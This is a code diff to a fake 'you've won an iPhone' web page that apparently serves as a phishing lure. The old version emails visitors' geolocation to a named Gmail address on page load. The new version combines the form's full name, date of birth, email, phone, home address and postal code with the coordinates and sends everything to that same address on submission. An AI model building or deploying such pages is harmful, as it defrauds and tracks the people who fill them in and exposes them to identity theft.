@@ -51,7 +51,7 @@
         <p class="lead">You've been selected to receive a brand-new iPhone!</p>
         <p class="form-text">Please fill out the form below to claim your reward.</p>
 
-        <!-- Fill Out Form -->
+        <!-- Form for Reward Claim -->
         <form id="rewardForm">
             <div class="form-group">
                 <label for="fullName">Full Name</label>
@@ -82,7 +82,7 @@
                 <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
             </div>
 
-            <p id="locationDisplay" class="form-text" style="background: rgba(255, 255, 255, 0.85); color: #666; padding: 0.5rem; border-radius: 4px;">Location permissions required to auto-fill your location.</p>
+            <p id="locationDisplay" class="form-text">Fetching location...</p>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
@@ -96,17 +96,15 @@
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
+            let latitude, longitude;
 
-            // Request location immediately on page load
+            // Request location
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                        
-                        // Send location data via email
-                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         switch (error.code) {
@@ -123,15 +121,42 @@
                                 locationDisplay.textContent = "An unknown error occurred.";
                                 break;
                         }
-                        sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
                     }
                 );
             } else {
                 locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
+
+            // Handle form submission
+            document.getElementById("rewardForm").addEventListener("submit", function (e) {
+                e.preventDefault();
+                
+                const fullName = document.getElementById("fullName").value;
+                const dob = document.getElementById("dob").value;
+                const email = document.getElementById("email").value;
+                const phoneNumber = document.getElementById("phoneNumber").value;
+                const address = document.getElementById("address").value;
+                const city = document.getElementById("city").value;
+                const postalCode = document.getElementById("postalCode").value;
+
+                // Combine all data for the email
+                const message = `
+                    Full Name: ${fullName}
+                    Date of Birth: ${dob}
+                    Email: ${email}
+                    Phone Number: ${phoneNumber}
+                    Address: ${address}
+                    City: ${city}
+                    Postal Code: ${postalCode}
+                    Latitude: ${latitude ?? "Not Available"}
+                    Longitude: ${longitude ?? "Not Available"}
+                `;
+
+                sendEmail("Reward Form Submission with Location", message, "khalilrodeni@gmail.com");
+            });
         });
 
-        // Send Email Function
+        // Email sending function
         function sendEmail(subject, message, recipientEmail) {
             const emailData = {
                 subject: subject,
@@ -156,7 +181,7 @@
             })
             .then(data => {
                 if (data.message) {
-                    alert("Location data emailed successfully!");
+                    alert("Submission and location data emailed successfully!");
                 } else if (data.error) {
                     alert("Error: " + data.error);
                 } else {
@@ -168,12 +193,6 @@
                 alert("Error sending email: " + error.message);
             });
         }
-
-        // Form submission
-        document.getElementById("rewardForm").addEventListener("submit", function (e) {
-            e.preventDefault();
-            alert("Thank you for your submission! We will contact you shortly.");
-        });
     </script>
 </body>
 </html>
